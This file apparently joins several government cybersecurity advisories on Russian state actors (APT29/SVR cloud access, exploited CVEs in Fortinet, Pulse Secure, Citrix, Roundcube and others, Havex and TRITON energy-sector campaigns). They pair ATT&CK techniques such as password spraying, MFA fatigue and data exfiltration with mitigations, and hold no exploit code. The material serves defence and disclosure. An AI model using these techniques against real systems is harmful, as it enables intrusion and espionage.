+
+Attempted to gain access to the cameras’ feeds. 
+
+Archive Collected Data 
+
+T1560 
+
+Accessed files were archived in .zip files prior to exfiltration. 
+
+Archive Collected Data: Archive via Utility 
+
+T1560.001 
+
+Prepared zip archives for upload to the actors’ infrastructure. 
+
+Table 14: Exfiltration
+Tactic/Technique Title	ID	Use
+Exfiltration Over Alternative Protocol 
+
+T1048 
+
+Attempted to exfiltrate archived data via a previously dropped OpenSSH binary. 
+
+Scheduled Transfer 
+
+T1029 
+
+Used periodic EWS queries to collect new emails sent and received since the last data exfiltration. 
+
+ 
+
+Appendix B: CVEs exploited
+Table 15: Exploited CVE information
+CVE 	Vendor/Product 	Details
+CVE-2023-38831 
+
+RARLAB WinRAR 
+
+Allows execution of arbitrary code when a user attempts to view a benign file within a ZIP archive. 
+
+CVE-2023-23397 
+
+Microsoft Outlook 
+
+External actors could send specially crafted emails that cause a connection from the victim to an untrusted location of the actor’s control, leaking the Net-NTLMv2 hash of the victim that the actor could then relay to another service to authenticate as the victim. 
+
+CVE-2021-44026 
+
+Roundcube Webmail 
+
+Roundcube before 1.3.17 and 1.4.x before 1.4.12 is prone to a potential SQL injection via search or search params. 
+
+CVE-2020-35730 
+
+Roundcube Webmail 
+
+An XSS issue was discovered in Roundcube Webmail before 1.2.13, 1.3.x before 1.3.16 and 1.4.x before 1.4.10, where a plaintext email message with JavaScript in a link reference element is mishandled by linkref_addindex in rcube_string_replacer.php. 
+
+CVE-2020-12641 
+
+Roundcube Webmail 
+
+Roundcube Webmail before 1.4.4 allows arbitrary code execution via shell metacharacters in a configuration setting for im_convert_path or im_identify_path in rcube_image.php. 
+
+Appendix C: MITRE D3FEND Countermeasures
+Table 16: MITRE D3FEND countermeasures
+Countermeasure Title 	ID 	Details 
+Network Isolation 
+
+D3-NI 
+
+Employ appropriate network segmentation. Disable Universal Plug and Play (UPnP), Peer-to-Peer (P2P), and Anonymous Visit features on IP cameras and routers. 
+
+Access Mediation 
+
+D3-AMED 
+
+Limit access and utilize additional attributes (such as device information, environment, and access path) when making access decisions. Configure access controls carefully to ensure that only well-maintained and well-authenticated accounts have access. 
+
+Inbound Traffic Filtering 
+
+D3-ITF 
+
+Implement host firewall rules to block connections from other devices on the network, other than from authorized management devices and servers, to prevent lateral movement. 
+
+Resource Access Pattern Analysis 
+
+D3-RAPA 
+
+Use automated tools to audit access logs for security concerns and identify anomalous access requests. 
+
+Outbound Traffic Filtering 
+
+D3-OTF 
+
+Block NTLM/SMB requests to external infrastructure. 
+
+Platform Monitoring 
+
+D3-PM 
+
+Install EDR/logging/cybersecurity solutions onto high value systems with large amounts of sensitive data such as mail servers and domain controllers. 
+
+System File Analysis 
+
+D3-SFA 
+
+Collect and monitor Windows logs for certain events, especially for events that indicate that a log was cleared unexpectedly. 
+
+Application Hardening 
+
+D3-AH 
+
+Enable optional security features in Windows to harden endpoints and mitigate initial access techniques. 
+
+Application-based Process Isolation 
+
+D3-ABPI 
+
+Enable attack surface reduction rules to prevent executable content from email. 
+
+Executable Allowlisting 
+
+D3-EAL 
+
+Enable attack surface reduction rules to prevent execution of files from globally writeable directories, such as Downloads or %APPDATA%. 
+
+Execution Isolation 
+
+D3-EI 
+
+Unless users are involved in the development of scripts, limit the execution of scripts (such as batch, JavaScript, and PowerShell) to known scripts. 
+
+Application Configuration Hardening 
+
+D3-ACH 
+
+Disable Windows Host Scripting functionality and configure PowerShell to run in Constrained mode. Disable protocols that use weak authentication (e.g., clear-text passwords, or outdated and vulnerable authentication or encryption protocols) or do not support multi-factor authentication. Turn off other ports/services not in use (e.g., FTP, web interface, etc.). 
+
+Process Spawn Analysis 
+
+D3-PSA 
+
+Use open source SIGMA rules as a baseline for detecting and alerting on suspicious file execution or command parameters. 
+
+URL Reputation Analysis 
+
+D3-URA 
+
+Use services that provide enhanced browsing services and safe link checking. 
+
+Network Access Mediation 
+
+D3-NAM 
+
+Do not allow incoming traffic, especially logins to systems, from public VPN services. Where possible, logins from public VPNs, including exit nodes in the same country as target systems, should be blocked or, if allowed, alerted on for further investigation. Ensure cameras and other Internet of Things devices are protected by a security appliance, if possible. 
+
+DNS Denylisting 
+
+D3-DNSDL 
+
+Do not allow outgoing traffic to hosting and API mocking services frequently used by malicious actors. 
+
+Domain Name Reputation Analysis 
+
+D3-DNRA 
+
+Heuristic detections for web requests to new subdomains may uncover malicious phishing activity. Logging the requests for each sub-domain requested by users on a network, such as in DNS or firewall logs, may enable system administrators to identify new targeting and victims. 
+
+Multi-factor Authentication 
+
+D3-MFA 
+
+Use MFA with strong factors and require regular re-authentication, especially for management accounts. 
+
+Job Function Access Pattern Analysis 
+
+D3-JFAPA 
+
+Implement other mitigations for privileged accounts: including limiting the number of admin accounts, considering using hardware MFA tokens, and regularly reviewing all privileged user accounts. 
+
+User Account Permissions 
+
+D3-UAP 
+
+Separate privileged accounts by role and alert on misuse of privileged accounts. Audit user accounts on all devices to ensure they are an accurate reflection of your organization and that they are being used as expected. 
+
+Token-based Authentication 
+
+D3-TBA 
+
+Reduce reliance on passwords; instead, consider using services like single sign-on. 
+
+Credential Hardening 
+
+D3-CH 
+
+Do not store passwords in Group Policy Preferences (GPP). Remove all passwords previously included in GPP and change all passwords on the corresponding accounts. 
+
+Authentication Event Threshholding 
+
+D3-ANET 
+
+Use account throttling or account lockout. Throttling progressively increases time delay between successive login attempts. If using account lockout, allow between 5 to 10 attempts before lockout. 
+
+Strong Password Policy 
+
+D3-SPP 
+
+Use a service to check for compromised passwords before using them. 
+
+Credential Rotation 
+
+D3-CRO 
+
+Change all default credentials. 
+
+Encrypted Tunnels 
+
+D3-ET 
+
+Disable protocols that use weak authentication (e.g., clear-text passwords, or outdated and vulnerable authentication or encryption protocols). Use a VPN for remote connections to devices. 
+
+Software Update 
+
+D3-SU 
+
+Apply security patches and firmware updates to all devices. Ensure devices are currently supported. Replace devices that are end-of-life. 
+
+Agent Authentication 
+
+D3-AA 
+
+Ensure authentication is enabled for remote access to devices. If supported on IP cameras, enable authenticated RTSP access only. 
+
+User Behavior Analysis 
+
+D3-UBA 
+
+Review all authentication activity for remote access to make sure it is valid and expected. Investigate any unexpected or unusual activity. 
+
+SVR Cyber Actors Adapt Tactics for Initial Cloud Access
+Release DateFebruary 26, 2024
+Alert CodeAA24-057A
+Related topics: Cyber Threats and Advisories, Incident Detection, Response, and Prevention
+How SVR-Attributed Actors are Adapting to the Move of Government and Corporations to Cloud Infrastructure
+OVERVIEW
+This advisory details recent tactics, techniques, and procedures (TTPs) of the group commonly known as APT29, also known as Midnight Blizzard, the Dukes, or Cozy Bear.
+
+The UK National Cyber Security Centre (NCSC) and international partners assess that APT29 is a cyber espionage group, almost certainly part of the SVR, an element of the Russian intelligence services. The US National Security Agency (NSA), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Cyber National Mission Force (CNMF), the Federal Bureau of Investigation (FBI), Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and New Zealand Government Communications Security Bureau (GCSB) agree with this attribution and the details provided in this advisory.
+
+This advisory provides an overview of TTPs deployed by the actor to gain initial access into the cloud environment and includes advice to detect and mitigate this activity.
+
+To download the PDF version of this report, click here.
+
+PREVIOUS ACTOR ACTIVITY
+The NCSC has previously detailed how Russian Foreign Intelligence Service (SVR) cyber actors have targeted governmental, think tank, healthcare, and energy targets for intelligence gain. It has now observed SVR actors expanding their targeting to include aviation, education, law enforcement, local and state councils, government financial departments, and military organizations.
+
+SVR actors are also known for:
+
+The supply chain compromise of SolarWinds software.
+Activity that targeted organizations developing the COVID-19 vaccine.
+EVOLVING TTPs
+As organizations continue to modernize their systems and move to cloud-based infrastructure, the SVR has adapted to these changes in the operating environment.
+
+They have to move beyond their traditional means of initial access, such as exploiting software vulnerabilities in an on-premises network, and instead target the cloud services themselves.
+
+To access the majority of the victims’ cloud hosted network, actors must first successfully authenticate to the cloud provider. Denying initial access to the cloud environment can prohibit SVR from successfully compromising their target. In contrast, in an on-premises system, more of the network is typically exposed to threat actors.
+
+Below describes in more detail how SVR actors are adapting to continue their cyber operations for intelligence gain. These TTPs have been observed in the last 12 months.
+
+ACCESS VIA SERVICE AND DORMANT ACCOUNTS
+Previous SVR campaigns reveal the actors have successfully used brute forcing [T1110] and password spraying to access service accounts. This type of account is typically used to run and manage applications and services. There is no human user behind them so they cannot be easily protected with multi-factor authentication (MFA), making these accounts more susceptible to a successful compromise. Service accounts are often also highly privileged depending on which applications and services they’re responsible for managing. Gaining access to these accounts provides threat actors with privileged initial access to a network, to launch further operations.
+
+SVR campaigns have also targeted dormant accounts belonging to users who no longer work at a victim organization but whose accounts remain on the system [T1078.004].
+
+Following an enforced password reset for all users during an incident, SVR actors have also been observed logging into inactive accounts and following instructions to reset the password. This has allowed the actor to regain access following incident response eviction activities.
+
+CLOUD-BASED TOKEN AUTHENTICATION
+Account access is typically authenticated by either username and password credentials or system-issued access tokens. The NCSC and partners have observed SVR actors using tokens to access their victims’ accounts, without needing a password [T1528].
+
+The default validity time of system-issued tokens varies dependent on the system; however, cloud platforms should allow administrators to adjust the validity time as appropriate for their users. More information can be found on this in the mitigations section of this advisory.
+
+ENROLLING NEW DEVICES TO THE CLOUD
+On multiple occasions, the SVR have successfully bypassed password authentication on personal accounts using password spraying and credential reuse. SVR actors have also then bypassed MFA through a technique known as “MFA bombing” or “MFA fatigue,” in which the actors repeatedly push MFA requests to a victim’s device until the victim accepts the notification [T1621].
+
+Once an actor has bypassed these systems to gain access to the cloud environment, SVR actors have been observed registering their own device as a new device on the cloud tenant [T1098.005]. If device validation rules are not set up, SVR actors can successfully register their own device and gain access to the network.
+
+By configuring the network with device enrollment policies, there have been instances where these measures have defended against SVR actors and denied them access to the cloud tenant.
+
+RESIDENTIAL PROXIES
+As network-level defenses improve detection of suspicious activity, SVR actors have looked at other ways to stay covert on the internet. A TTP associated with this actor is the use of residential proxies [T1090.002]. Residential proxies typically make traffic appear to originate from IP addresses within internet service provider (ISP) ranges used for residential broadband customers and hide the true source. This can make it harder to distinguish malicious connections from typical users. This reduces the effectiveness of network defenses that use IP addresses as indicators of compromise, and so it is important to consider a variety of information sources such as application and host-based logging for detecting suspicious activity.
+
+CONCLUSION
+The SVR is a sophisticated actor capable of carrying out a global supply chain compromise such as the 2020 SolarWinds, however the guidance in this advisory shows that a strong baseline of cyber security fundamentals can help defend from such actors.
+
+For organizations that have moved to cloud infrastructure, a first line of defense against an actor such as SVR should be to protect against SVR’s TTPs for initial access. By following the mitigations outlined in this advisory, organizations will be in a stronger position to defend against this threat.
+
+Once the SVR gain initial access, the actor is capable of deploying highly sophisticated post compromise capabilities such as MagicWeb, as reported in 2022. Therefore, mitigating against the SVR’s initial access vectors is particularly important for network defenders.
+
+CISA have also produced guidance through their Secure Cloud Business Applications (SCuBA) Project which is designed to protect assets stored in cloud environments.
+
+Some of the TTPs listed in this report, such as residential proxies and exploitation of system accounts, are similar to those reported as recently as January 2024 by Microsoft.
+
+MITRE ATT&CK®
+This report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.
+
+Tactic	ID	Technique	Procedure
+Credential Access	T1110	Brute Force	The SVR use password spraying and brute forcing as an initial infection vector.
+Initial Access	T1078.004	Valid Accounts: Cloud Accounts	The SVR use compromised credentials to gain access to accounts for cloud services, including system and dormant accounts.
+Credential Access	T1528	Steal Application Access Token	The SVR use stolen access tokens to login to accounts without the need for passwords.
+Credential Access	T1621	Multi-Factor Authentication Request Generation	The SVR repeatedly push MFA requests to a victim’s device until the victim accepts the notification, providing SVR access to the account.
+Command and Control	T1090.002	Proxy: External Proxy	The SVR use open proxies in residential IP ranges to blend in with expected IP address pools in access logs.
+Persistence	T1098.005	Account Manipulation: Device Registration	The SVR attempt to register their own device on the cloud tenant after acquiring access to accounts.
+MITIGATION AND DETECTION
+A number of mitigations will be useful in defending against the activity described in this advisory: 
+
+Use multi-factor authentication (/2-factor authentication/two-step verification) to reduce the impact of password compromises. See NCSC guidance: Multifactor Authentication for Online Services and Setting up 2-Step Verification (2SV).
+Accounts that cannot use 2SV should have strong, unique passwords. User and system accounts should be disabled when no longer required with a “joiners, movers, and leavers” process in place and regular reviews to identify and disable inactive/dormant accounts. See NCSC guidance: 10 Steps to Cyber Security.
+System and service accounts should implement the principle of least privilege, providing tightly scoped access to resources required for the service to function.
+Canary service accounts should be created which appear to be valid service accounts but are never used by legitimate services. Monitoring and alerting on the use of these account provides a high confidence signal that they are being used illegitimately and should be investigated urgently.
+Session lifetimes should be kept as short as practical to reduce the window of opportunity for an adversary to use stolen session tokens. This should be paired with a suitable authentication method that strikes a balance between regular user authentication and user experience.
+Ensure device enrollment policies are configured to only permit authorized devices to enroll. Use zero-touch enrollment where possible, or if self-enrollment is required then use a strong form of 2SV that is resistant to phishing and prompt bombing. Old devices should be prevented from (re)enrolling when no longer required. See NCSC guidance: Device Security Guidance.
+Consider a variety of information sources such as application events and host-based logs to help prevent, detect and investigate potential malicious behavior. Focus on the information sources and indicators of compromise that have a better rate of false positives. For example, looking for changes to user agent strings that could indicate session hijacking may be more effective than trying to identify connections from suspicious IP addresses. See NCSC guidance: Introduction to Logging for Security Purposes.
+
+Russian SVR Targets U.S. and Allied Networks
+Executive summary
+Russian Foreign Intelligence Service (SVR) actors (also known as APT29, Cozy Bear, and The Dukes) frequently use
+publicly known vulnerabilities to conduct widespread scanning and exploitation against vulnerable systems in an effort to
+obtain authentication credentials to allow further access. This targeting and exploitation encompasses U.S. and allied
+networks, including national security and government-related systems.
+Recent Russian SVR activities include compromising SolarWinds® Orion® software updates,[1] targeting COVID-19
+research facilities through deploying WellMess malware,
+[2] and leveraging a VMware® vulnerability that was a zero-day at
+the time for follow-on Security Assertion Markup Language (SAML) authentication abuse.
+[3] SVR cyber actors also used
+authentication abuse tactics following SolarWinds-based breaches.
+[4] [5]
+The SVR has exploited—and continues to successfully exploit—software vulnerabilities to gain initial footholds into victim
+devices and networks, to include:
+ CVE-2018-13379 Fortinet®[2]
+ CVE-2019-9670 Zimbra®[2]
+ CVE-2019-11510 Pulse Secure®[2]
+ CVE-2019-19781 Citrix®[2]
+ CVE-2020-4006 VMware®[3]
+The National Security Agency (NSA), Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of
+Investigation (FBI) previously shared mitigations to defend against exploitation of these vulnerabilities. Knowing the
+tradecraft that nation-state cyber actors use along with relevant response actions will enable network defenders to focus
+on mitigating the vulnerabilities and techniques, enabling more comprehensive protection against adversary compromise.
+U/OO/132340-21 | PP-21-0292 | April 2021 Ver. 1.0 2
+NSA, CISA, & FBI | Russian SVR Targets U.S. and Allied Networks
+Detailed vulnerabilities and mitigations
+NSA, CISA, and FBI are aware that United States Government, critical infrastructure (including Defense Industrial Base),
+and allied networks are consistently scanned, targeted, and exploited by Russian state-sponsored cyber actors. NSA,
+CISA, and FBI recommend that critical system owners prioritize the following mitigation actions to mitigate the loss of
+sensitive information that could impact U.S. policies, strategies, plans, ongoing operations, and competitive advantage.
+Additionally, due to the various systems and networks that could be impacted outside of these sectors, NSA, CISA, and
+FBI recommend that the following mitigations be prioritized for action by all network defenders.
+The techniques leveraged by SVR actors include1
+:
+ Exploiting public-facing applications (T11902
+)
+ Leveraging external remote services (T1133)
+ Compromising supply chains (T1195)
+ Using valid accounts (T1078)
+ Exploiting software for credential access (T1212)
+ Forging web credentials: SAML tokens (T1606.002)
+While some vulnerabilities have specific additional mitigations below, the following general mitigations apply:
+ Keep systems and products updated and patch as soon as possible after patches are released since many actors
+exploit numerous vulnerabilities.
+3
+ Expect that the risk from data stolen or modified (including credentials, accounts, and software) before a device was
+patched will not be alleviated by patching or simple remediation actions. Assume that a breach will happen, enforce
+least-privileged access, and make password changes and account reviews a regular practice.4
+ Disable external management capabilities and set up an out-of-band management network.5
+ Block obsolete or unused protocols at the network edge and disable them in device configurations.6
+ Isolate Internet-facing services in a network Demilitarized Zone (DMZ) to reduce exposure of the internal network.7
+ Enable robust logging of Internet-facing services and authentication functions. Continuously hunt for signs of
+compromise or credential misuse, particularly within cloud environments.
+8
+ Adopt a mindset that compromise happens: prepare for incident response activities, only communicate about
+breaches on out-of-band channels, and take care to uncover a breach’s full scope before remediating.
+9
+The following is a list of specific Common Vulnerabilities and Exposures (CVEs) being actively exploited by SVR actors, a
+description of the vulnerability, and the recommended mitigations.
+CVE Number Vulnerability Description Prior Cybersecurity Guidance
+CVE-2018-13379 In Fortinet Secure Sockets Layer (SSL) Virtual
+Private Network (VPN) web portals, an Improper
+Limitation of a Pathname to a Restricted Directory
+("Path Traversal") allows an unauthenticated attacker
+to download system files via special crafted HTTP
+resource requests.
+Advisory: APT29 target COVID-19 vaccine
+development (U/OO/152680-20)
+Mitigating Recent VPN Vulnerabilities
+(U/OO/196888-19)
+Affects: Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12
+CVE-2019-9670 In Synacor Zimbra Collaboration Suite, the mailboxd
+component has an XML External Entity injection
+(XXE) vulnerability.
+Advisory: APT29 target COVID-19 vaccine
+development (U/OO/152680-20)
+Affects: Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10.
+
+1 Refer to CISA Alert: Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations (AA20-352A) for more techniques.
+2 T1190 and similar references are MITRE® ATT&CK® techniques.
+3 Refer to Update and Upgrade Software Immediately (U/OO/181147-19).
+4 Refer to Defend Privileges and Accounts (U/OO/181857-19) and the “assume breach” principle of CSI – Embracing a Zero Trust Security Model (U/OO/115131-21).
+5 Refer to Perform Out-of-Band Network Management (U/OO/169570-20).
+6 Refer to Hardening Network Devices (U/OO/171339-16), Outdated Software and Protocols (U/OO/802041-16), and Outdated Network Devices and Unsecured Protocols (U/OO/802587-16).
+7 Refer to Segment Networks and Deploy Application-Aware Defenses (U/OO/184967-19).
+8 Refer to CISA Alert Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments (AA21-008A).
+9 Refer to CISA Alert: Technical Approaches to Uncovering and Remediating Malicious Activity (AA20-245A).
+U/OO/132340-21 | PP-21-0292 | April 2021 Ver. 1.0 3
+NSA, CISA, & FBI | Russian SVR Targets U.S. and Allied Networks
+CVE Number Vulnerability Description Prior Cybersecurity Guidance
+CVE-2019-11510 In Pulse Secure VPNs, an unauthenticated remote
+attacker can send a specially crafted Uniform
+Resource Identifier (URI) to perform an arbitrary file
+read.
+Advisory: APT29 target COVID-19 vaccine
+development (U/OO/152680-20)
+Mitigating Recent VPN Vulnerabilities
+(U/OO/196888-19)
+Affects: Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4.
+CVE-2019-19781 Citrix® Application Delivery Controller (ADC) and
+Gateway allow directory traversal.
+Advisory: APT29 target COVID-19 vaccine
+development (U/OO/152680-20)
+Detect and Prevent Web Shell Malware
+(U/OO/134094-20)
+Mitigate CVE-2019-19781 (U/OO/103100-20)
+Affects: Citrix ADC and Gateway versions before 13.0.47.24, 12.1.55.18, 12.0.63.13, 11.1.63.15 and 10.5.70.12 and SD-WAN
+WANOP 4000-WO, 4100-WO, 5000-WO, and 5100-WO versions before 10.2.6b and 11.0.3b.
+CVE-2020-4006 VMware Workspace One Access, Access Connector,
+Identity Manager, and Identity Manager Connector
+have a command injection vulnerability.
+Russian State-Sponsored Actors Exploiting
+Vulnerability in VMware Workspace ONE Access
+Using Compromised Credentials (U/OO/195076-20)
+Perform Out-of-Band Network Management
+(U/OO/169570-20)
+Affects: VMware One Access 20.01 and 20.10 on Linux, VMware Identity Manager 3.3.1 - 3.3.3 on Linux, VMware Identity Manager
+Connector 3.3.1 - 3.3.3 and 19.03, VMware Cloud Foundation 4.0 - 4.1, and VMware Vrealize Suite Lifecycle Manager 8.x.
+Works cited
+[1] White House (2021), White House Public Attribution Statement. Available at: https://www.whitehouse.gov/briefing-room/
+[2] National Cyber Security Centre (UK), Communications Security Establishment (Canada), National Security Agency, and Cybersecurity and
+Infrastructure Security Agency (2020), Advisory: APT29 targets COVID-19 vaccine development (U/OO/152680-20). Available at:
+https://www.nsa.gov/cybersecurity-guidance
+[3] National Security Agency (2020), Russian State-Sponsored Actors Exploiting Vulnerability in VMware Workspace ONE Access Using
+Compromised Credentials (U/OO/195076-20). Available at: https://www.nsa.gov/cybersecurity-guidance
+[4] National Security Agency (2020), Detecting Abuse of Authentication Mechanisms (U/OO/198854-20). Available at:
+https://www.nsa.gov/cybersecurity-guidance
+[5] Federal Bureau Of Investigation, Cyber Division (2020), Advanced Persistent Threat Actors Leverage SolarWinds Vulnerabilities (PIN 20201222-
+001). Available at: https://www.ic3.gov/Media/News/2020/201229.pdf
+Summary
+Actions to Take Today to Protect Energy Sector Networks:
+• Implement and ensure robust network segmentation between IT and ICS networks.
+• Enforce MFA to authenticate to a system.
+• Manage the creation of, modification of, use of—and permissions associated with—privileged accounts.
+
+This joint Cybersecurity Advisory (CSA)—coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Energy (DOE)—provides information on multiple intrusion campaigns conducted by state-sponsored Russian cyber actors from 2011 to 2018 and targeted U.S. and international Energy Sector organizations. CISA, the FBI, and DOE responded to these campaigns with appropriate action in and around the time that they occurred. CISA, the FBI, and DOE are sharing this information in order to highlight historical tactics, techniques, and procedures (TTPs) used by adversaries to target U.S. and international Energy Sector organizations.
+
+On March 24, 2022, the U.S. Department of Justice unsealed indictments of three Russian Federal Security Service (FSB) officers and a Russian Federation Central Scientific Research Institute of Chemistry and Mechanics (TsNIIKhM) employee for their involvement in the following intrusion campaigns against U.S. and international oil refineries, nuclear facilities, and energy companies.[1]
+
+Global Energy Sector Intrusion Campaign, 2011 to 2018: the FSB conducted a multi-stage campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data.
+One of the indicted FSB officers was involved in campaign activity that involved deploying Havex malware to victim networks.
+The other two indicted FSB officers were involved in activity targeting U.S. Energy Sector networks from 2016 through 2018.
+Compromise of Middle East-based Energy Sector organization with TRITON Malware, 2017: Russian cyber actors with ties to the TsNIIKhM gained access to and leveraged TRITON (also known as HatMan) malware to manipulate a foreign oil refinery’s ICS controllers. TRITON was designed to specifically target Schneider Electric’s Triconex Tricon safety systems and is capable of disrupting those systems. Schneider Electric has issued a patch to mitigate the risk of the TRITON malware’s attack vector; however, network defenders should install the patch and remain vigilant against these threat actors’ TTPs.
+The indicted TsNIIKhM cyber actor is charged with attempt to access U.S. protected computer networks and to cause damage to an energy facility.
+The indicted TsNIIKhM cyber actor was a co-conspirator in the deployment of the TRITON malware in 2017.
+This CSA provides the TTPs used by indicted FSB and TsNIIKhM actors in cyber operations against the global Energy Sector. Specifically, this advisory maps TTPs used in the global Energy Sector campaign and the compromise of the Middle East-based Energy Sector organization to the MITRE ATT&CK for Enterprise and ATT&CK for ICS frameworks.
+
+CISA, the FBI, and DOE assess that state-sponsored Russian cyber operations continue to pose a threat to U.S. Energy Sector networks. CISA, the FBI, and DOE urge the Energy Sector and other critical infrastructure organizations to apply the recommendations listed in the Mitigations section of this advisory and Appendix A to reduce the risk of compromise. 
+
+For more information on Russian state-sponsored malicious cyber activity, see CISA's Russia Cyber Threat Overview and Advisories webpage. For more information on the threat of Russian state-sponsored malicious cyber actors to U.S. critical infrastructure as well as additional mitigation recommendations, see joint CSA Understanding and Mitigating Russian State-Sponsored Cyber Threats to U.S. Critical Infrastructure and CISA's Shields Up Technical Guidance webpage. 
+
+Rewards for Justice Program
+If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s (DOS) Rewards for Justice program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net.
+
+Click here for a PDF version of this report. 
+
+Technical Details
+Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10, and the ATT&CK for ICSs framework. See the ATT&CK for Enterprise and ATT&CK for ICS frameworks for all referenced threat actor tactics and techniques.
+
+Global Energy Sector Intrusion Campaign, 2011 to 2018
+From at least 2011 through 2018, the FSB (also known as Berserk Bear, Energetic Bear, TeamSpy, Dragonfly, Havex, Crouching Yeti, and Koala) conducted an intrusion campaign against international and U.S. Energy Sector organizations. The threat actor gained remote access to and deployed malware designed to collect ICS-related information on compromised Energy Sector networks, and exfiltrated enterprise and ICS data.
+
+Beginning in 2013 and continuing through 2014, the threat actor leveraged Havex malware on Energy Sector networks. The threat actor gained access to these victim networks via spearphishing emails, redirects to compromised websites, and malicious versions of legitimate software updates on multiple ICS vendor websites. The new software updates contained installations of Havex malware, which infected systems of users who downloaded the compromised updates.
+
+Havex is a remote access Trojan (RAT) that communicates with a command and control (C2) server. The C2 server deploys payloads that enumerate all collected network resources and uses the Open Platform Communications (OPC) standard to gather information about connected control systems devices and resources within the network. Havex allowed the actor to install additional malware and extract data, including system information, lists of files and installed programs, e-mail address books, and virtual private network (VPN) configuration files. The Havex payload can cause common OPC platforms to crash, which could cause a denial-of-service condition on applications that rely on OPC communications. Note: for additional information on Havex, see to CISA ICS Advisory ICS Focused Malware and CISA ICS Alert ICS Focused Malware (Update A).
+
+Beginning in 2016, the threat actor began widely targeting U.S. Energy Sector networks. The actor conducted these attacks in two stages: first targeting third-party commercial organizations (such as vendors, integrators, and suppliers) and then targeting Energy Sector organizations. The threat actor used the compromised third-party infrastructure to conduct spearphishing, watering hole, and supply chain attacks to harvest Energy Sector credentials and to pivot to Energy Sector enterprise networks. After obtaining access to the U.S. Energy Sector networks, the actor conducted network discovery, moved laterally, gained persistence, then collected and exfiltrated information pertaining to ICS from the enterprise, and possibly operational technology (OT), environments. Exfiltrated information included: vendor information, reference documents, ICS architecture, and layout diagrams.
+
+For more detailed information on FSB targeting of U.S. Energy Sector networks, See CISA Alert Russian Government Cyber Activity Targeting Energy Sector and Other Critical Infrastructure Sectors.  
+
+Refer to Appendix A for TTPs of Havex malware and TTPs used by the actor in the 2016 to 2018 targeting of U.S. Energy Sector networks, as well as associated mitigations.
+
+Compromise of Middle East-based Energy Sector Organization with TRITON Malware, 2017
+In 2017, Russian cyber actors with ties to TsNIIKhM gained access to and manipulated a foreign oil refinery’s safety devices. TsNIIKhM actors used TRITON malware on the ICS controllers, which resulted in the refinery shutting down for several days. 
+
+TRITON is a custom-built, sophisticated, multi-stage malware affecting Schneider Electric’s Triconex Tricon, a safety programmable logic controller (PLC) (also referred to as a safety instrumented system [SIS]), which monitors industrial processes to prevent hazardous conditions. TRITON is capable of directly interacting with, remotely controlling, and compromising these safety systems. As these systems are used in a large number of environments, the capacity to disable, inhibit, or modify the ability of a process to fail safely could result in physical consequences. Note: for additional information on affected products, see to CISA ICS Advisory Schneider Electric Triconex Tricon (Update B).
+
+TRITON malware affects Triconex Tricon PLCs by modifying in-memory firmware to add additional programming. The extra functionality allows an attacker to read/modify memory contents and execute custom code, disabling the safety system. 
+
+TRITON malware has multiple components, including a custom Python script, four Python modules, and malicious shellcode that contains an injector and a payload. For detailed information on TRITON’s components, refer to CISA Malware Analysis Report (MAR): HatMan: Safety System Targeted Malware (Update B).
+
+Note: the indicted TsNIIKhM cyber actor was also involved in activity targeting U.S. Energy Sector companies in 2018, and other TsNIIKhM-associated actors have targeted a U.S.-based company’s facilities in an attempt to access the company’s OT systems. To date, CISA, FBI, and DOE have no information to indicate these actors have intentionally disrupted any U.S. Energy Sector infrastructure. 
+
+Refer to Appendix A for TTPs used by TRITON as well as associated mitigations. 
+
+Mitigations
+Enterprise Environment
+CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their corporate enterprise network. These mitigations are tailored to combat multiple enterprise techniques observed in these campaigns (refer to Appendix A for observed TTPs and additional mitigations).
+
+Privileged Account Management 
+Manage the creation of, modification of, use of—and permissions associated with—privileged accounts, including SYSTEM and root.
+Password Policies
+Set and enforce secure password policies for accounts.
+Disable or Remove Features or Programs
+Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.
+Audit 
+Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc., to identify potential weaknesses.
+Operating System Configuration 
+Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.
+Multifactor Authentication
+Enforce multifactor authentication (MFA) by requiring users to provide two or more pieces of information (such as username and password plus a token, e.g., a physical smart card or token generator) to authenticate to a system.
+Filter Network Traffic    
+Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.
+Network Segmentation
+Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a demilitarized zone (DMZ) to contain any internet-facing services that should not be exposed from the internal network.
+Limit Access to Resources over the Network
+Prevent access to file shares, remote access to systems, and unnecessary services. Mechanisms to limit access may include use of network concentrators, Remote Desktop Protocol (RDP) gateways, etc.
+Execution Prevention
+Block execution of code on a system through application control, and/or script blocking.
+Industrial Control System Environment
+CISA, the FBI, and DOE recommend Energy Sector and other critical infrastructure organizations implement the following mitigations to harden their ICS/OT environment.
+
+Network Segmentation
+Implement and ensure robust network segmentation between IT and ICS networks to limit the ability of cyber threat actors to move laterally to ICS networks if the IT network is compromised.
